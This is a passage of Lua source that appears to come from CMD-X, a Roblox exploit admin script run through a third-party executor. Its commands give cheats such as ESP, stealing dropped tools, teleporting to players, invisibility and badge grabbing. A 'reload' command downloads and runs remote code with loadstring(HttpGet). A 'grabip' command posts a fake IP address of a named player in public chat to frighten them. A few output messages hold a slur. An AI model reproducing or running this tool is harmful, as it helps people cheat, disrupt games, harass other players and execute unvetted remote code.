				CMDTab[1] = MoreArg
			elseif arguments[2] == "2" then
				T2.Text = MoreArg
				CMDTab[2] = MoreArg
			elseif arguments[2] == "3" then
				T3.Text = MoreArg
				CMDTab[3] = MoreArg
			elseif arguments[2] == "4" then
				T4.Text = MoreArg
				CMDTab[4] = MoreArg
			elseif arguments[2] == "5" then
				T5.Text = MoreArg
				CMDTab[5] = MoreArg
			elseif arguments[2] == "6" then
				T6.Text = MoreArg
				CMDTab[6] = MoreArg
			elseif arguments[2] == "7" then
				T7.Text = MoreArg
				CMDTab[7] = MoreArg
			elseif arguments[2] == "8" then
				T8.Text = MoreArg
				CMDTab[8] = MoreArg
			elseif arguments[2] == "9" then
				T9.Text = MoreArg
				CMDTab[9] = MoreArg
			end
		else
			opx("*","3 arguments are required!")
		end
	end

	function useCommand.lockws()
		opx("-","Locked workspace")
		local x = 0
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") then
				x = x + 1
				if x == 50 then wait(.1); x = 0 end
				v.Locked = true
			end
		end
	end

	function useCommand.unlockws()
		opx("-","Locked workspace")
		local x = 0
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") then
				x = x + 1
				if x == 50 then wait(.1); x = 0 end
				v.Locked = false
			end
		end
	end

	function useCommand.day()
		opx("-","It is now day")
		cmdl.ClockTime = 14
	end

	function useCommand.night()
		opx("-","It is now night")
		cmdl.ClockTime = 0
	end

	function useCommand.removesky()
		opx("-","You have removed the skybox")
		for i,v in pairs(cmdl:GetChildren()) do
			if v:IsA("Sky") then
				v:Destroy()
			end
		end
	end

	function useCommand.restorelighting()
		cmdl.Ambient = Color3.new(0.715, 0.715, 0.715)
		cmdl.Brightness = 1
		cmdl.ClockTime = 14
		cmdl.ColorShift_Bottom = Color3.new(0, 0, 0)
		cmdl.ColorShift_Top = Color3.new(0, 0, 0)
		cmdl.ExposureCompensation = 0
		cmdl.FogColor = Color3.new(0.754, 0.754, 0.754)
		cmdl.FogEnd = 100000
		cmdl.FogStart = 0
		cmdl.GeographicLatitude = 41.73
		cmdl.GlobalShadows = false
		cmdl.OutdoorAmbient = Color3.new(0.400, 0.400, 0.400)
		cmdl.Outlines = true
		opx("-","Restored lighting to original settings")
	end

	function useCommand.restorecamera()
		opx("-","Restored camera to original settings")
		workspace.Camera.FieldOfView = 70
		workspace.Camera.CameraType = "Track"
		cmdlp.CameraMaxZoomDistance = 400
		cmdlp.CameraMinZoomDistance = 0.5
		cmdlp.CameraMode = "Classic"
		cmdlp.EnableMouseLockOption = true
	end

	function useCommand.unscramble()
		opx("-","Unscrambled names")
		for i,v in pairs(game:GetDescendants()) do
			if v:IsA("Workspace") or v:IsA("Camera") or v:IsA("Players") or v:IsA("Lighting") or v:IsA("ReplicatedStorage") or v:IsA("StarterPlayer") then
				v.Name = v.ClassName
			end
		end
	end

	function useCommand.removeinviswalls()
		opx("-","Removed invisible walls")
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
				if v.Transparency == 1 then
					v:Destroy()
				end
			end
		end
	end

	function useCommand.gameinfo()
		opx("-","Game info opened")
		function getAsset(ID)
			return("http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=420&height=230&assetId="..ID)
		end
		gameframe.Visible = true
		gameframe:TweenSize(UDim2.new(0,300,0,433), Enum.EasingDirection.In, Enum.EasingStyle.Quad, .5)
		gameimage.Image = getAsset(game.PlaceId)
		local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
		gameview.Text = "You are playing "..GetName.Name
		gameid.Text = "ID of game: "..game.PlaceId
		uptime.Text = "Uptime (s): "..workspace.DistributedGameTime
		if workspace.FilteringEnabled == true then
			fecheck.Text = "Filtering is enabled"
		else
			fecheck.Text = "Filtering is disabled"
		end
	end

	function useCommand.closegameinfo()
		opx("-","Game info closed")
		gameframe.Visible = false
	end

	function useCommand.math()
		if arguments[4] then
			if arguments[3] == "+" then
				local add = arguments[2] + arguments[4]
				opx("-",arguments[2].." + "..arguments[4].." = "..add)
				if arguments[5] == "cb" or arguments[5] == "copy" then
					setclipboard(arguments[2].." + "..arguments[4].." = "..add)
				end
			elseif arguments[3] == "-" then
				local subtract = arguments[2] - arguments[4]
				opx("-",arguments[2].." - "..arguments[4].." = "..subtract)
				if arguments[5] == "cb" or arguments[5] == "copy" then
					setclipboard(arguments[2].." - "..arguments[4].." = "..subtract)
				end
			elseif arguments[3] == "/" then
				local divide = arguments[2] / arguments[4]
				opx("-",arguments[2].." / "..arguments[4].." = "..divide)
				if arguments[5] == "cb" or arguments[5] == "copy" then
					setclipboard(arguments[2].." / "..arguments[4].." = "..divide)
				end
			elseif arguments[3] == "*" then
				local times = arguments[2] * arguments[4]
				opx("-",arguments[2].." * "..arguments[4].." = "..times)
				if arguments[5] == "cb" or arguments[5] == "copy" then
					setclipboard(arguments[2].." * "..arguments[4].." = "..times)
				end
			else
				opx("*","A proper multiplication sign is needed!")
			end
		else
			opx("*","2 numbers and a multiplication sign is needed")
		end
	end

	function useCommand.hidechat()
		opx("-","Chat is disabled")
		game:GetService("StarterGui"):SetCoreGuiEnabled('Chat', false)
	end

	function useCommand.showchat()
		opx("-","Chat is enabled")
		game:GetService("StarterGui"):SetCoreGuiEnabled('Chat', true)
	end

	function useCommand.switchteam()
		if arguments[2] then
			opx("-","Switched team to: "..arguments[2])
			cmdlp.Team = arguments[2]
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.ping()
		local ping = (1/wait())
		local pingexact = string.sub(ping,0,4)
		opx("-","Pong! Your ping is "..pingexact.."ms")
	end

	function useCommand.toolfps()
		opx("-","FPS will now show")
		local ToolNameGrabber = Instance.new("ScreenGui", getParent)
		local ToolNameTxt = Instance.new("TextLabel", getParent)
		local player = cmdlp
		ToolNameGrabber.Name = "ToolNameGrabber"
		ToolNameGrabber.Parent = game.CoreGui
		ToolNameGrabber.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		ToolNameGrabber.Enabled = true
		ToolNameTxt.Name = "ToolNameTxt"
		ToolNameTxt.Parent = ToolNameGrabber
		ToolNameTxt.BackgroundColor3 = Color3.new(1, 1, 1)
		ToolNameTxt.BackgroundTransparency = 1
		ToolNameTxt.BorderColor3 = Color3.new(0, 0, 0)
		ToolNameTxt.Position = UDim2.new(0.894944727, 0, 0.952606618, 0)
		ToolNameTxt.Size = UDim2.new(0, 133, 0, 30)
		ToolNameTxt.Font = Enum.Font.GothamSemibold
		ToolNameTxt.Text = "TextLabel"
		ToolNameTxt.TextColor3 = Color3.new(1, 1, 1)
		ToolNameTxt.TextScaled = true
		ToolNameTxt.TextSize = 14
		ToolNameTxt.TextWrapped = true
		ToolNameTxt.Visible = true
		local FpsLabel = ToolNameTxt
		local Heartbeat = game:GetService("RunService").Heartbeat
		local LastIteration, Start
		local FrameUpdateTable = { }
		local function HeartbeatUpdate()
			LastIteration = tick()
			for Index = #FrameUpdateTable, 1, -1 do
				FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
			end
			FrameUpdateTable[1] = LastIteration
			local CurrentFPS = (tick() - Start >= 1 and #FrameUpdateTable) or (#FrameUpdateTable / (tick() - Start))
			CurrentFPS = CurrentFPS - CurrentFPS % 1
			FpsLabel.Text = "" .. CurrentFPS .. " FPS"
		end
		Start = tick()
		Heartbeat:Connect(HeartbeatUpdate)
	end

	function useCommand.fps()
		local HBFps = 0
		local Heartbeat = game:GetService("RunService").Heartbeat
		local LastIteration, Start
		local FrameUpdateTable = { }
		local function HeartbeatUpdate()
			LastIteration = tick()
			for Index = #FrameUpdateTable, 1, -1 do
				FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
			end
			FrameUpdateTable[1] = LastIteration
			local CurrentFPS = (tick() - Start >= 1 and #FrameUpdateTable) or (#FrameUpdateTable / (tick() - Start))
			CurrentFPS = CurrentFPS - CurrentFPS % 1
			HBFps = CurrentFPS
		end
		Start = tick()
		local x = Heartbeat:Connect(HeartbeatUpdate)
		wait(.5)
		x:Disconnect()
		opx("-",HBFps.."FPS")
	end

	function useCommand.untoolfps()
		opx("-","No longer showing FPS")
		game.CoreGui.ToolNameGrabber:Destroy()
	end

	function useCommand.gametime()
		opx("-",math.floor(workspace.DistributedGameTime).."s in game")
	end

	function useCommand.resetsaves()
		Confirm("Default","This will reset your stats and saves.")
		if Confirmation then
			opx("-","Successfully reset your CMD-X.")
			if isfile("CMD-X.lua") then
				delfile("CMD-X.lua")
			end
		end
	end

	function useCommand.savesaves()
		opx("-","A save was copied to your clipboard")
		setclipboard(readfile("CMD-X.lua"))
		writefile("CMD-X.save",readfile("CMD-X.lua"))
	end

	function useCommand.migratesaves()
		Confirm("Default","This will replace your stats and saves.")
		if Confirmation then
			if arguments[2] then
				if isfile(arguments[2]) then
					opx("-","Migrated "..arguments[2].." to current saves")
					writefile("CMD-X.lua",readfile(arguments[2]))
				else
					opx("*","You do not have a save by that name.")
				end
			else
				if isfile("CMD-X.save") then
					opx("-","Migrated CMD-X.save to current saves")
					writefile("CMD-X.lua",readfile("CMD-X.save"))
				else
					opx("*","You do not have a CMD-X save.")
				end
			end
		end
	end

	function useCommand.resetguipos()
		opx("-","Reset GUI position")
		holder.Position = UDim2.new(0, 147, 0, 324)
	end

	function useCommand.fuckoff()
		opx("-",":(")
		Unnamed:Destroy()
	end

	function useCommand.reload()
		opx("-","Reloading CMD-X...")
		loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
	end

	function useCommand.partesp()
		if arguments[2] == "class" then
			opx("-","PartESP Enabled")
			IESPenabled = true
			for _,i in pairs(workspace:GetDescendants()) do
				if i:IsA(arguments[3]) then
					if arguments[3] == "ClickDetector" or arguments[3] == "TouchInterest" then
						if i:IsA("BasePart") then
							IESP(i.Parent)
						end
					else
						if i:IsA("BasePart") then
							IESP(i)
						end
					end
				end
			end
		elseif arguments[2] == "name" then
			opx("-","PartESP Enabled")
			for _,i in pairs(workspace:GetDescendants()) do
				if i:IsA("BasePart") and i.Name == arguments[3] then
					IESP(i)
				end
			end
		else
			opx("*","2 arguments are required")
		end
	end

	function useCommand.unpartesp()
		opx("-","PartESP disabled")
		IESPenabled = false
		for _,i in pairs(workspace:GetDescendants()) do
			for a,v in pairs(cmdlp.PlayerGui:GetChildren()) do
				if v.Name == i:GetFullName()..'_IESP' then
					v:Destroy()
				end
			end
		end
	end

	function useCommand.backpack()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				xTools = ""
				Num = 0
				for i,v in pairs(target.Backpack:GetChildren()) do
					if v:IsA("Tool") then
						xTools = xTools..v.Name..", "
						Num = Num+1
					end
				end
				opxL("Backpack",Num.."|"..xTools)
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.messagebox()
		if messageboxasync then
			opx("-","Opened message box, "..getstring(2))
			messageboxasync(getstring(2), "CMD-X Message", 262148)
		else
			opx("*","Your exploit does not support messageboxes!")
		end
	end

	function useCommand.enabledrops()
		opx("-","Enabled tool dropping")
		for i,v in pairs(cmdlp.Backpack:GetChildren()) do
			v.CanBeDropped = true
		end
		cmdlp.Character:FindFirstChildOfClass("Tool").CanBeDropped = true
	end

	local noVoid = false
	function useCommand.novoid()
		opx("-","NoVoid is now enabled")
		noVoid = true
		cmdlp.Character.ChildAdded:Connect(function(rg)
			if rg:IsA("Tool") and noVoid == true then
				rg:Destroy()
			end
		end)
	end

	function useCommand.yesvoid()
		noVoid = false
		opx("-","NoVoid is now disabled")
	end

	function useCommand.disabledrops()
		opx("-","Disabled tool dropping")
		for i,v in pairs(cmdlp.Backpack:GetChildren()) do
			v.CanBeDropped = false
		end
		cmdlp.Character:FindFirstChildOfClass("Tool").CanBeDropped = false
	end

	function firetouchinterestX(v, x)
		if firetouchinterest then
			firetouchinterest(cmdlp.Character.HumanoidRootPart, v, 0)
			firetouchinterest(cmdlp.Character.HumanoidRootPart, v, 1)
		else
			local LoggedFrame = v.CFrame
			v.CanCollide = false
			v.CFrame = cmdlp.Character.HumanoidRootPart.CFrame
			wait()
			v.CFrame = LoggedFrame
		end
	end

	local toolsget = nil
	function useCommand.grabtools()
		opx("-","Now getting tools")
		for i,v in pairs(workspace:GetChildren()) do
			if v:IsA("Tool") and v:FindFirstChild("Handle") then
				firetouchinterestX(v.Handle)
			end
		end
		toolsget = workspace.ChildAdded:Connect(function(v)
			if v:IsA("Tool") then
				firetouchinterestX(v:WaitForChild("Handle"))
			end
		end)
	end

	function useCommand.ungrabtools()
		opx("-","No longer getting tools")
		toolsget:Disconnect()
		toolsget = nil
	end

	function useCommand.earrape()
		opx("-","Played all workspace sounds")
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("Sound") then 
				v:Play()
			end
		end
	end

	function useCommand.respectfiltering()
		if not game:GetService("SoundService").RespectFilteringEnabled then
			opx("-","Respect Filtering is disabled")
		else
			opx("*","Respect Filtering is enabled")
		end
	end

	function useCommand.filtering()
		opx("-","retard")
	end

	function useCommand.weed()
		opx("-","go outside and smoke some weed its 4/20")
	end

	function useCommand.gameid()
		opx("-","The games id you are playing on is "..game.PlaceId)
	end

	function useCommand.jobid()
		opx("-",game.JobId)
	end

	function useCommand.output()
		if arguments[2] then
			local outputstring = getstring(2)
			opx("-",outputstring)
		else
			opx("*","Output is missing text")
		end
	end

	function useCommand.grabip()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				local firstIntegers = {"149","82","83","84","72","73","74","92","93","94","182","183","184","172","173","174","192","193","194","198","197"}
				math.randomseed(target.UserId + 5)
				sayremote:FireServer(target.Name.."s IP is uw"..firstIntegers[math.random(1,#firstIntegers)].."."..math.random(20,150).."."..math.random(30,192).."."..math.random(50,99), "All")
				opx("-",target.Name.."s fake IP was said in chat")
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.enableshiftlock()
		cmdlp.DevEnableMouseLock = true
		opx("-","Shift lock has been force enabled")    
	end

	function useCommand.disableshiftlock()
		cmdlp.DevEnableMouseLock = false
		opx("-","Shift lock has been force disabled")    
	end

	function useCommand.maxcamunlock()
		opx("-","Unlocked camera lock")
		cmdlp.CameraMaxZoomDistance = 100000
	end

	function useCommand.position()
		if cmdlp.Character and cmdlp.Character:FindFirstChild("HumanoidRootPart") then
			local pos = tostring(cmdlp.Character.HumanoidRootPart.Position)
			opx("-","Your position is "..pos)
			if arguments[2] == "cb" or arguments[2] == "copy" then
				setclipboard(pos)
			end
		end
	end

	function useCommand.audiolog()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				for i,logger in pairs(target.Character:GetChildren()) do
					if logger.Name == "SuperFlyGoldBoombox" or logger.Name == "Boombox" or logger.Name == "Music" or logger.Name == "Radio" or logger.Name == "#Boombox" or logger.Name == "BoomBox" then
						opx("-","Users audio is "..logger.Handle.Sound.SoundId)
						if arguments[3] == "cb" or arguments[2] == "copy" then
							setclipboard(logger.Handle.Sound.SoundId)
						end
					else
						opx("*","Something went wrong")
					end
				end
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	local bobbleEffect = false
	function useCommand.cambobble()
		opx("-","Now bobbling camera")
		bobbleEffect = true
		local RunService = game:GetService("RunService")
		local function updateBobbleEffect()
			local now = tick()
			if cmdlp.Character.Humanoid.MoveDirection.Magnitude > 0 then
				local velocity = cmdlp.Character.Humanoid.RootPart.Velocity
				local bobble_X = math.cos(now * 9) / 5
				local bobble_Y = math.abs(math.sin(now * 12)) / 5
				local bobble = Vector3.new(bobble_X,bobble_Y,0) * math.min(1, velocity.Magnitude / cmdlp.Character.Humanoid.WalkSpeed)
				cmdlp.Character.Humanoid.CameraOffset = cmdlp.Character.Humanoid.CameraOffset:lerp(bobble,.75)
			else
				cmdlp.Character.Humanoid.CameraOffset = cmdlp.Character.Humanoid.CameraOffset * 0.75
			end
		end 
		while bobbleEffect do
			wait()
			updateBobbleEffect()
		end
	end

	function useCommand.uncambobble()
		opx("-","Now longer bobbling camera")
		bobbleEffect = false
	end

	local moveToMouse = false
	function useCommand.grapple()
		opx("-","Now grappling")
		moveToMouse = true
		local bpNew = Instance.new("BodyPosition",cmdlp.Character.HumanoidRootPart)
		while moveToMouse do
			wait()
			local mousePosY = cmdm.Hit.Y
			local mousePosX = cmdm.Hit.X
			local mousePosZ = cmdm.Hit.Z
			bpNew.Position = Vector3.new(mousePosX,mousePosY,mousePosZ)
		end
	end

	function useCommand.ungrapple()
		opx("-","No longer grappling")
		moveToMouse = false
		cmdlp.Character.HumanoidRootPart.BodyPosition:Destroy()
	end

	function useCommand.remind()
		if arguments[4] then
			local timeCall = arguments[2]
			local reminderCall = getstring(4)
			if arguments[3] == "second" or arguments[3] == "sec" or arguments[3] == "s" then
				opx("-","You will be reminded about '"..reminderCall.."' in "..timeCall.."s")
				wait(timeCall)
			elseif arguments[3] == "minute" or arguments[3] == "min" or arguments[3] == "m" then
				opx("-","You will be reminded about '"..reminderCall.."' in "..timeCall.."m")
				wait(timeCall * 60)
			elseif arguments[3] == "hour" or arguments[3] == "hr" or arguments[3] == "h" then
				opx("-","You will be reminded about '"..reminderCall.."' in "..timeCall.."h")
				wait(timeCall * 3600)
			end
			output9.Text = output8.Text
			output8.Text = output7.Text
			output7.Text = output6.Text
			output6.Text = output5.Text
			output5.Text = output4.Text
			output4.Text = output3.Text
			output3.Text = output2.Text
			output2.Text = output1.Text
			opx("-","Reminder ("..timeCall.."): "..reminderCall)
		else
			opx("*","You need 4 arguments for this command")
		end
	end

	local step = false
	function useCommand.step()
		step = true
		repeat wait()
			local currentTorso = nil
			function findT()
				if cmdlp.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
					currentTorso = cmdlp.Character.UpperTorso
				elseif cmdlp.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
					currentTorso = cmdlp.Character.Torso
				end
			end
			findT()
			if currentTorso == nil then
				findT()
			end
			currentTorso.Touched:Connect(function(hit)
				if step == true then
					local cmdlpHRP = cmdlp.Character.HumanoidRootPart
					if hit:IsA("BasePart") and hit.Position.Y > cmdlpHRP.Position.Y - cmdlp.Character.Humanoid.HipHeight then
						local findHRP = hit.Parent:FindFirstChild("HumanoidRootPart")
						if findHRP ~= nil then
							cmdlpHRP.CFrame = hit.CFrame * CFrame.new(cmdlpHRP.CFrame.lookVector.X,findHRP.Size.Z/2 + cmdlp.Character.Humanoid.HipHeight,cmdlpHRP.CFrame.lookVector.Z)
						elseif findHRP == nil then
							cmdlpHRP.CFrame = hit.CFrame * CFrame.new(cmdlpHRP.CFrame.lookVector.X,hit.Size.Y/2 + cmdlp.Character.Humanoid.HipHeight,cmdlpHRP.CFrame.lookVector.Z)
						end
					end
				end
			end)
		until step == false
		opx("-","Step enabled")
	end

	function useCommand.unstep()
		step = false
		opx("-","Step disabled")
	end

	function useCommand.antiafk()
		opx("-","You will now no longer idle in games")
		cmdlp.Idled:connect(function()
			cmdvu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
			wait(1)
			cmdvu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
		end)
	end

	local nosit = false
	function useCommand.nosit()
		nosit = true
		opx("-","Nosit enabled")
		while nosit do
			wait(.1)
			if cmdlp.Character.Humanoid.Sit == true then
				wait(.1)
				cmdlp.Character.Humanoid.Sit = false
			end
		end
	end

	function useCommand.yessit()
		nosit = false
		opx("-","Nosit disabled")
	end

	local nostun = false
	function useCommand.nostun()
		nostun = true
		opx("-","Nostun enabled")
		while nostun do
			wait(.1)
			if cmdlp.Character.Humanoid.PlatformStand == true then
				wait(.1)
				cmdlp.Character.Humanoid.PlatformStand = false
			end
		end
	end

	function useCommand.yesstun()
		nostun = false
		opx("-","Nostun disabled")
	end

	function useCommand.badges()
		opx("-","Collecting badges (if there is any)")
		for i,v in pairs(workspace:GetDescendants()) do
			if v.Name == "BadgeAwarder" or v.Name == "Platform" then
				v.CFrame = cmdlp.Character.HumanoidRootPart.CFrame
				v.CanCollide = false
			elseif v.Name == "BadgeAwarderScript" then
				v.Parent.CFrame = cmdlp.Character.HumanoidRootPart.CFrame
				v.CanCollide = false
			end
		end  
	end

	local bhopping = false
	function useCommand.bunnyhop()
		opx("-","Started BHopping")
		bhopping = true
		repeat wait()
			cmdlp.Character.Humanoid.Jump = true
		until bhopping == false
	end

	function useCommand.unbunnyhop()
		opx("-","Stopped BHopping")
		bhopping = false
	end

	function useCommand.invisible()
		opx("-","You are now invisible")
		for i,m in pairs(cmdlp.Character:GetChildren()) do
			if m:IsA("Part") or m:IsA("MeshPart") then
				if m.Name ~= "HumanoidRootPart" and m.Name ~= "Handle" or m:IsA("Part") then
					m.Material = "ForceField"
				end
			elseif m:IsA("Accessory") then
				m:Destroy()
			end
		end
		local Players = cmdp
		local function CheckRig()
			if Players.LocalPlayer.Character then
				if cmd15(cmdlp) then
					return 'R15'
				else
					return 'R6'
				end
			end
		end
		local function InitiateInvis()
			local Character = Players.LocalPlayer.Character
			local StoredCF = Character.PrimaryPart.CFrame
			local Part = Instance.new('Part',workspace)
			Part.Size = Vector3.new(5,0,5)
			Part.Anchored = true
			Part.CFrame = CFrame.new(Vector3.new(9999,9999,9999))
			Character.PrimaryPart.CFrame = Part.CFrame*CFrame.new(0,3,0)
			wait(3)
			Part:Destroy()
			if CheckRig() == 'R6' then
				local Clone = Character.HumanoidRootPart:Clone()
				Character.HumanoidRootPart:Destroy()
				Clone.Parent = Character
			else
				local Clone = Character.LowerTorso.Root:Clone()
				Character.LowerTorso.Root:Destroy()
				Clone.Parent = Character.LowerTorso
			end
		end
		InitiateInvis()
	end

	function useCommand.sit()
		cmdlp.Character.Humanoid.Sit = true
		opx("-","You just sat your ass down")
	end

	function useCommand.sitwalk()
		opx("-","Sit walk enabled")
		anims = cmdlp.Character.Animate
		xNoSit = {
			anims.idle:FindFirstChildOfClass("Animation").AnimationId, 
			anims.walk:FindFirstChildOfClass("Animation").AnimationId, 
			anims.run:FindFirstChildOfClass("Animation").AnimationId, 
			anims.jump:FindFirstChildOfClass("Animation").AnimationId,
			cmdlp.Character.Humanoid.HipHeight,
		}
		local sit = anims.sit:FindFirstChildOfClass("Animation").AnimationId
		anims.idle:FindFirstChildOfClass("Animation").AnimationId = sit
		anims.walk:FindFirstChildOfClass("Animation").AnimationId = sit
		anims.run:FindFirstChildOfClass("Animation").AnimationId = sit
		anims.jump:FindFirstChildOfClass("Animation").AnimationId = sit
		if cmd6(cmdlp) then
			cmdlp.Character.Humanoid.HipHeight = -1.5
		else
			cmdlp.Character.Humanoid.HipHeight = 0.5
		end
	end

	function useCommand.unsitwalk()
		anims.idle:FindFirstChildOfClass("Animation").AnimationId = xNoSit[1]
		anims.walk:FindFirstChildOfClass("Animation").AnimationId = xNoSit[2]
		anims.run:FindFirstChildOfClass("Animation").AnimationId = xNoSit[3]
		anims.jump:FindFirstChildOfClass("Animation").AnimationId = xNoSit[4]
		cmdlp.Character.Humanoid.HipHeight = xNoSit[5]
		cmdlp.Character.Humanoid.Jump = true
	end

	function useCommand.freeze()
		opx("-","You froze your character")
		for i,v in pairs(cmdlp.Character:GetChildren()) do
			if v:IsA("BasePart") then
				v.Anchored = true
			end
		end
	end

	function useCommand.thaw()
		opx("-","You thawed your character")
		for i,v in pairs(cmdlp.Character:GetChildren()) do
			if v:IsA("BasePart") then
				v.Anchored = false
			end
		end
	end

	function useCommand.goto()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				cmdlp.Character.Humanoid.Jump = true
				cmdlp.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
				opx("-","Teleported to player "..target.Name)
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	local walkto = false
	function useCommand.walkto()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				cmdlp.Character.Humanoid.Jump = true
				opx("-","Walking to "..target.Name)
				walkto = true
				repeat wait()
					cmdlp.Character.Humanoid:MoveTo(target.Character.HumanoidRootPart.Position)
				until walkto == false
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.unwalkto()
		opx("-","Stopped walking to")
		walkto = false
	end

	function useCommand.walktopos()
		if not arguments[4] then
			opx("*","4 arguments are required!")
			return
		end
		opx("-","Now walking to "..arguments[2].." "..arguments[3].." "..arguments[4])
		cmdlp.Character.Humanoid.Jump = true
		cmdlp.Character.Humanoid.WalkToPoint = Vector3.new(arguments[2],arguments[3],arguments[4])
	end

	function useCommand.walktopart()
		if not arguments[2] then
			opx("*","2 arguments are required!")
			return
		end
		for i,v in pairs(workspace:GetDescendants()) do
			if v.Name == getstring(2) then
				opx("-","Now walking to part")
				cmdlp.Character.Humanoid.Jump = true
				cmdlp.Character.Humanoid.WalkToPart = v
				break
			end
		end
	end

	function useCommand.walktoclass()
		if not arguments[2] then
			opx("*","2 arguments are required!")
			return
		end
		for i,v in pairs(workspace:GetDescendants()) do
			if v.ClassName == getstring(2) then
				opx("-","Now walking to part")
				cmdlp.Character.Humanoid.Jump = true
				cmdlp.Character.Humanoid.WalkToPart = v
				break
			end
		end
	end

	YesGo = false
	function useCommand.refresh()
		opx("-","Character respawning")
		if Noclipping then
			Noclipping:Disconnect()
			YesGo = true
		end
		refresh()
		if YesGo == true then
			noclip()
			YesGo = false
		end
		opx("-","Character respawned")
	end

	function useCommand.reset()
		opx("-","Resetting character")
		cmdlp.Character.Humanoid.Health = 0
		opx("-","Character reset")
	end

	function useCommand.savepos()
		if arguments[2] then
			wpNS = getstring(2)
			T = cmdlp.Character.PrimaryPart
			WPs[#WPs+1] = {N = wpNS, C = {math.floor(T.Position.X), math.floor(T.Position.Y), math.floor(T.Position.Z)}}
			updatesaves()
			opx("-","Saved current position (Use lpos "..tostring(wpNS).." to load)")
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.loadpos()
		if arguments[2] then
			wpNS = getstring(2)
			for i,v in pairs(WPs) do
				local xc = WPs[i].C[1]
				local yc = WPs[i].C[2]
				local zc = WPs[i].C[3]
				if tostring(WPs[i].N) == tostring(wpNS) then
					cmdlp.Character.HumanoidRootPart.CFrame = CFrame.new(xc,yc,zc)
				end
			end
			opx("Teleported to "..tostring(wpNS))
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.loadbppos()
		if arguments[2] then
			wpNS = getstring(2)
			for i,v in pairs(WPs) do
				local xc = WPs[i].C[1]
				local yc = WPs[i].C[2]
				local zc = WPs[i].C[3]
				if tostring(WPs[i].N) == tostring(wpNS) then
					game:GetService("TweenService"):Create(cmdlp.Character.HumanoidRootPart, TweenInfo.new(1, Enum.EasingStyle.Linear), {CFrame = CFrame.new(xc,yc,zc)}):Play()
				end
			end
			opx("Teleported to "..tostring(wpNS))
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.memory()
		opx("-",math.floor(stats():GetTotalMemoryUsageMb()).."mb")
	end

	function useCommand.audiotp()
		if tonumber(arguments[2]) then
			local Sounds = {}
			for i,v in pairs(cmdlp.Character:GetDescendants()) do
				if v:IsA("Tool") then
					for x,y in pairs(v:GetDescendants()) do
						if y:IsA("Sound") then
							y.TimePosition = arguments[2]
						end
					end
				end
			end
			for i,v in pairs(cmdlp.Backpack:GetDescendants()) do
				if v:IsA("Tool") then
					for x,y in pairs(v:GetDescendants()) do
						if y:IsA("Sound") then
							y.TimePosition = arguments[2]
						end
					end
				end
			end
			opx("-","Audio TimePosition teleported to "..arguments[2])
		else
			opx("*","2 arguments are required!")
		end
	end

	local Platform = false
	function useCommand.platform()
		opx("-","You are now using an invisible platform")
		Platform = true
		local pc = cmdlp.Character
		if pc and not pc:FindFirstChild("pf") then
			local pf = Instance.new('Part', pc)
			pf.Name = 'pf'
			pf.Transparency = 1
			pf.Size = Vector3.new(6,1,6)
			pf.Anchored = true
			pf.CFrame = pc.HumanoidRootPart.CFrame * CFrame.new(0,-3.5,0)
			while wait(0.1) do
				if pc:FindFirstChild("pf") then
					pf.CFrame = pc.HumanoidRootPart.CFrame * CFrame.new(0,-3.5,0)
				else
					break
				end
			end
		end
	end

	function useCommand.unplatform()
		Platform = false
		local pc = cmdlp.Character
		opx("-","You are no longer using an invisible platform")
		if pc:FindFirstChild("pf") then
			pc.pf:Destroy()
		end
	end

	clicktplimit = clicktplimit or 0
	local clicktps = false
	function useCommand.clicktp()
		clicktps = true
		opx("-","ClickTP enabled aim at the location and press CTRL to tp")
		hum = cmdlp.Character.HumanoidRootPart
		if hotkeyctp == "LeftControl" then
			cmduis.InputBegan:Connect(function(input)
				if cmduis:IsKeyDown(Enum.KeyCode.LeftControl) and clicktps == true then
					if cmdm.Target then
						local desired_position = CFrame.new(cmdm.Hit.X, cmdm.Hit.Y + 5, cmdm.Hit.Z)
						local direction = CFrame.new(hum.Position, desired_position.p).LookVector
						local distance = (hum.Position - desired_position.p).Magnitude
						if clicktplimit == 0 then
							hum.CFrame = hum.CFrame + direction * distance
						elseif distance > clicktplimit then
							hum.CFrame = hum.CFrame + direction * clicktplimit
						else
							hum.CFrame = hum.CFrame + direction * distance
						end
					end
				end
			end)
		else
			mouse.KeyDown:connect(function(key)
				if key == hotkeyctp and clicktps == true then
					if cmdm.Target then
						local desired_position = CFrame.new(cmdm.Hit.X, cmdm.Hit.Y + 5, cmdm.Hit.Z)
						local direction = CFrame.new(hum.Position, desired_position.p).LookVector
						local distance = (hum.Position - desired_position.p).Magnitude
